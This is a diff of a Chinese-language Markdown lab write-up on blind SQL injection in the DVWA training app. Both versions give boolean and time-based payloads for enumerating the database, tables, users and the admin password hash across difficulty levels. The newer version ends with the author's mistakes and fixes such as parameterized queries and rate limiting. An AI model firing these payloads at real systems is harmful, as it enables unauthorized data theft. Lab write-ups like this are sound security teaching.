@@ -1,258 +1,143 @@
-# SQL Injection(Blind)盲注
-1. 与普通SQL注入不同，盲注页面通常不会直接回显数据库内容
-2. 仅仅告诉你类似：User ID exists in the database 或者是User ID is MISSING from the database.
-3. 也就是说，你只能通过页面返回的真假差异或者响应时间差异来一点点推断数据库信息。
+# SQL Injection(Blind)
 
-# LOW等级实操
-### 1判断是否存在注入
-1. 输入恒真条件:1' AND '1'='1
-2. 如果返回User ID exists in the database.
-<img src='low1.png'>
-说明条件为真
+同样的查询，但页面不回显数据，只告诉你一句 `User ID exists in the database.` 或者 `User ID is MISSING from the database.`
 
-3. 输入恒假条件:1' AND '1'='2
-4. 如果返回User ID is MISSING from the database.
-<img src='low2.png'>
-**说明真假条件能够控制页面返回结果，就说明存在布尔盲注**
+没有回显，就只能问是非题：一次问一个问题，答案就是页面返回的那两个词。这就是盲注的起点。
 
+## 先确认真假能控制页面
 
-## 2使用注释符截断后续 SQL
-1. 常见payload:1' AND 1=1#
-2. URL中#需要编码为%23
-3. 例如：?id=1' AND 1=1%23&Submit=Submit
+```
+1' AND '1'='1     → User ID exists in the database.
+1' AND '1'='2     → User ID is MISSING from the database.
+```
 
-## 3判断数据库名长度
-1. 判断数据库名长度是否为4
-输入
-```html
+![恒真](low1.png)
+
+![恒假](low2.png)
+
+恒真返回存在、恒假返回不存在，说明能通过条件真假影响输出，可以盲注了。
+
+注释符用 `#` 或 `-- `。放 URL 里 `#` 会被浏览器截断，必须写成 `%23`：
+
+```
+?id=1' AND 1=1%23&Submit=Submit
+```
+
+## 布尔盲注：一位一位问
+
+先问长度，用二分法比一位一位试快得多：
+
+```
 1' AND LENGTH(DATABASE())=4#
-```
-如果返回exists.说明当前数据库名长度为4
-2. 判断是否大于3
-输入
-```html
 1' AND LENGTH(DATABASE())>3-- -
-```
-如果返回exits,则说明存在
-3. 判断是否大于5
-输入
-```javascript
 1' AND LENGTH(DATABASE())>5-- -
 ```
 
-##  4获取数据库名
-使用substring()和substr()逐字符判断
-1. 判断数据库第一个为否为d
->1' AND SUBSTRING(DATABASE(),1,1)='d'-- -
-如果返回exist，说明第一位是d
-2. 判断数据吗第二位是否为V
->1' AND SUBSTRING(DATABASE(),2,1)='v'-- -
-以此类推，最终得到dvwa
+返回存在就说明当前库名长度是 4。
 
-## 5判断当前数据库用户
-1. 判断当前用户长度
->1' AND LENGTH(USER())>10-- -
-2. 判断 USER() 第一个字符
->1' AND SUBSTRING(USER(),1,1)='r'-- -
-3. 很多本地环境可能是：root@localhost
-
-## 5枚举表名
-常用的表有：
-```html
-information_schema.tables
-information_schema.columns
-```
-1. 判断当前数据库中有多少张表
->1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())=2-- -
-如果返回exists,说明当前数据库有2张表,也可以逐步判断
-```html
-1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())>1-- -
-或者
-1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())>2-- -
-```
-DVWA常见的表包括：guestbook
-users
-
-2. 判断第一张表名字长度
->1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1))=5-- -
-如果返回exist，则第一张表名长度为5,但默认数据库的第一张为9(guestbook)
->1' and length((select table_name from information_schema.tables where table_schema=database() Limit 0,1))=9#
-3. 枚举第一张表名
->1' and substring((select table_name from information_schema.tables where table_schema=database() limit 0,1)1,1)='g'#
-以此类推推出表名
-
-## 6枚举字段名
-1. 判断users表字段数量
->1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users')>5-- -
-2. 判断第一个字段名长度
->1' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0,1))=7-- -
-3. 枚举字段名
->1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0,1),1,1)='u'-- -
-
-## 7枚举users表数据
-### 判断Users表中有多少用户
-> 1' AND (SELECT COUNT(user) FROM users)=5-- -
-通常为:
-```html
-admin
-gordonb
-1337
-pablo
-smithy
-```
-### 判断第一个用户名长度
->1' AND LENGTH((SELECT user FROM users LIMIT 0,1))=5-- -
-如果返回exist，说明第一个用户名长度为5
-### 枚举第一个用户名
-1. 判断第一个字符是否为a
->1' AND SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1)='a'-- -
-<img src='low3.png'>
-
-2. 判断第二个字符是否为d 
->1' AND SUBSTRING((SELECT user FROM users LIMIT 0,1),2,1)='d'-- -
-依次判断，即可得到admin
-
-### 枚举admin的密码哈希
->DVWA中的Password字段一般是哈希值，不是明文
-判断admin密码哈希长度
->1' AND LENGTH((SELECT password FROM users WHERE user='admin'))=32-- -
-常见MD5长度是32
-枚举哈希第1位
->1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5'-- -
-```html
-最终结果可能类似5f4dcc3b5aa765d61d8327deb882cf99
-```
-该MD5对应password
-
-## 8时间盲注实操
-```html
-布尔盲注依赖页面返回内容不同。
-
-时间盲注依赖响应时间不同。
-
-例如：如果条件为真，就延迟 3 秒；否则正常返回。
-
+再问字符，`SUBSTRING` 一次取一位：
 
 ```
-1. 判断是否存在时间盲注
->1' AND SLEEP(3)-- -
-如果页面明显延迟约三秒，说明可以使用时间盲注
-2. 条件性时间盲注
-判断数据库长度是否为4
->1' AND IF(LENGTH(DATABASE())=4,SLEEP(3),0)-- -
-如果延迟三秒，说明数据库长度为4
-3. 判断数据库名第一个字符
->1' AND IF(SUBSTRING(DATABASE(),1,1)='d',SLEEP(3),0)-- -
-如果延迟三秒，说明第一个字符是d 
-4. 使用ASCII判断
->1' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)-- -
-如果延迟，说明第一位ASCII是100.也就是字符d
-5. 时间盲注枚举admin密码哈希
-判断第一个字符是否为5:
->1' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5',SLEEP(3),0)-- -
-判断第二个字符
->1' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),2,1)='f',SLEEP(3),0)-- -
+1' AND SUBSTRING(DATABASE(),1,1)='d'-- -
+1' AND SUBSTRING(DATABASE(),2,1)='v'-- -
+```
 
-# Medium等级实操
-1. 页面使用下拉框选择 ID
-2. 输入点不再直接暴露
-3. 部分特殊字符被转义
-4. 请求方式可能变成 POST
-5. 需要配合 Burp Suite 修改参数
+按这个顺序问下来就是 `dvwa`。每个位置理论上要试 36 次（字母加数字），加上 ASCII 二分能压到 7 次左右：
 
-## 1.使用burp suite抓包
-开启Burp代理，提交一次正常请求
-可能会抓到以下请求
-```html
+```
+1' AND ASCII(SUBSTRING(DATABASE(),1,1))>100-- -
+```
+
+库名拿下之后是同一条路，套进子查询：
+
+```
+1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())=2-- -
+1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1))=9-- -
+1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1)='g'-- -
+```
+
+`LIMIT 0,1` 是取第几张表。第一张表名长度 9，是 `guestbook`；要问第二张就把 `0,1` 改成 `1,1`。
+
+字段名、用户名、密码哈希都是同一个套路，换个表名的事。users 表里五个用户，第一个是 `admin`，密码哈希 32 位，`5f4dcc3b...` 那个。
+
+![枚举用户名第一位](low3.png)
+
+## 时间盲注：连真假都看不见的时候
+
+如果页面不管条件真假都返回同一句话，布尔这条路也断了。这时候用时间当信道：条件成立就让数据库睡三秒。
+
+```
+1' AND SLEEP(3)-- -
+```
+
+页面明显卡三秒，说明 `SLEEP` 执行了，能注入。
+
+把条件塞进 `IF`：
+
+```
+1' AND IF(LENGTH(DATABASE())=4,SLEEP(3),0)-- -
+1' AND IF(SUBSTRING(DATABASE(),1,1)='d',SLEEP(3),0)-- -
+1' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)-- -
+```
+
+数据量一大就很难受。32 位哈希要问 32 个字符，每个字符最坏 36 次，一次 3 秒，光一条密码就是好几个小时。所以真实场景里时间盲注基本都交给 sqlmap，手工只用来验证注入点是否成立。
+
+## Medium
+
+页面变成下拉框，请求变成 POST，特殊字符被转义。抓包后请求体是这样：
+
+```
 POST /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
-Host: 127.0.0.1
 Cookie: security=medium; PHPSESSID=xxxx
 
 id=1&Submit=Submit
 ```
-## 2.修改ID参数
-Medium中id可能是数字型注入，不一定需要单引号
-恒真测试
->1 AND 1=1 
-请求体
->id=1 AND 1=1&Submit=Submit
-可能需要URL编码：
->id=1%20AND%201=1&Submit=Submit
-恒假测试
->1 AND 1=2
-请求体
->id=1%20AND%201=2&Submit=Submit
-如果前者返回exist,后者返回Missing，说明存在注入
-## 3.Meidum布尔盲注数据库名
-判断数据库名长度
->1 AND LENGTH(DATABASE())=4
-URL编码后
->id=1%20AND%20LENGTH(DATABASE())=4&Submit=Submit
-## 4.Medium枚举数据库名
->1 AND SUBSTRING(DATABASE(),1,1)='d'
-URL编码
->id=1%20AND%20SUBSTRING(DATABASE(),1,1)='d'&Submit=Submit
-如果单引号被转义或者过滤，可以尝试使用ASCII
->1 AND ASCII(SUBSTRING(DATABASE(),1,1))=100
-对应请求参数:
->id=1%20AND%20ASCII(SUBSTRING(DATABASE(),1,1))=100&Submit=Submit
-## 5. 时间盲注
->1 AND IF(LENGTH(DATABASE())=4,SLEEP(3),0)
-或者
->1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)
 
-# High等级实操
-特点：
-1. 使用 Session 保存参数
-2. 页面结构有所变化
-3. 查询中可能加入 LIMIT 1
-4. 需要更注意注释截断
-5. 可能要求从另一个输入窗口提交 ID
+数字型，不用闭合引号。改请求体的时候注意 URL 编码，空格是 `%20`：
 
-### 1.正常测试:
-1. 输入1
-2. 观察返回：
-User ID exists in the database.
-3. 输入999
-4. 观察返回
->User ID is MISSING from the database.
-### 2. 布尔测试
-1. 如果是字符型注入，尝试:
->1' AND 1=1-- -
-或者
->1' AND 1=2-- -
-如果第一条exists,第二条missing，说明可注入
-
-### 3. 绕过limit1
-Hwigh代码中可能类似:
->SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;
-1. 可以用注释符截断后面的：
->1' AND 1=1-- -
-2. 原SQL变成类似
->SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1-- -' LIMIT 1;
--- - 后面的内容被注释掉了，也可以使用:
->1' AND 1=1#
-### High枚举数据库名
-1. 判断长度:
->1' AND LENGTH(DATABASE())=4-- -
-2. 判断字符
->1' AND ASCII(SUBSTRING(DATABASE(),1,1))=100-- -
-3. 时间盲注
->1' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)-- -
-
-# Impossible等级分析：
-它通常会使用
-1. Prepared Statements，预处理语句
-2. 参数化查询
-3. Anti-CSRF Token
-4. 输入类型校验
-5. 严格的错误处理
-点兴趣安全代码思路：
-```html
-$stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
-$stmt->bind_param("i", $id);
-$stmt->execute();
 ```
-这里的核心是：
->SQL 结构和用户输入分离
-用户输入不会被当成SQL语句的一部分执行，而是作为普通数据处理
+id=1 AND 1=1&Submit=Submit
+id=1%20AND%201=2&Submit=Submit
+```
+
+前者 exists、后者 missing，注入成立。
+
+后面照旧，只是单引号进了请求体容易被吃掉，遇到 `'d'` 不生效就换 ASCII：
+
+```
+id=1%20AND%20ASCII(SUBSTRING(DATABASE(),1,1))=100&Submit=Submit
+```
+
+时间盲注同理：
+
+```
+id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)
+```
+
+## High
+
+High 把参数存进 Session，页面拆成两步提交，SQL 末尾加了 `LIMIT 1`。Session 只是换了个传参位置，Burp 抓的还是同一个请求，改 `id` 就行。`LIMIT 1` 照例用注释符切掉：
+
+```
+1' AND 1=1-- -
+```
+
+`-- -` 把后面的 `' LIMIT 1` 注释掉，剩下的和 Low 一样。
+
+## Impossible 为什么打不进去
+
+和上一节的 SQL 注入同一个原因：预编译加 `bind_param("i", $id)`，输入永远只是值。另外还加了 Anti-CSRF token 和输入类型校验。
+
+## 我卡住的地方
+
+- `#` 直接写在 URL 里会失效，第一次试了半天以为过滤了，其实是浏览器把 `#` 后面当锚点，请求根本没发出去。看到 `%23` 才反应过来。
+- `LIMIT 0,1` 里的 `0` 是偏移不是序号，改成 `1,1` 才是第二张表。这个记错过一次。
+- 时间盲注第一次只试了 `SLEEP(3)`，看到慢了三秒就以为成了，其实还得用 `IF` 包条件才算真的能用。
+
+## 怎么修
+
+同上一节，参数化查询是主因。盲注之所以存在，是因为"存在/不存在"这两种响应本身泄露了一位信息。所以除了修注入点，还可以：
+
+1. 统一提示。查到和没查到返回一模一样的页面、一样的长度。
+2. 关掉 SQL 报错，别让长度和时间出现可测的差异。
+3. 对同一 IP 的查询做频率限制。盲注要靠成千上万次请求，限速直接让它跑不完。
